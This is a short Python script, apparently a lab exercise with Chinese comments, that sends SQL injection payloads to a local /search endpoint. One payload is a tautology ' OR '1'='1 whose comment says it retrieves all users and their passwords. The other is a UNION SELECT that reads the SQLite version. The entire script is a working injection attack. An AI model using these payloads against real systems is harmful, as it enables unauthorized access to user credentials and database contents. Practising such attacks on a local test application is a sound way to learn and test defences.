import requests

url = "http://127.0.0.1:5000/search"

# 1. 恒真注入，获取所有用户
payload = "' OR '1'='1"
params = {'q': payload}
response = requests.get(url, params=params)
print("注入结果:")
# 简单提取用户名密码（实际应解析HTML，这里直接打印）
print(response.text)

# 2. 联合查询获取数据库版本（SQLite）
payload2 = "' UNION SELECT sqlite_version(), '2' -- "
params = {'q': payload2}
response = requests.get(url, params=params)
print("\n联合查询结果（数据库版本）:")
print(response.text)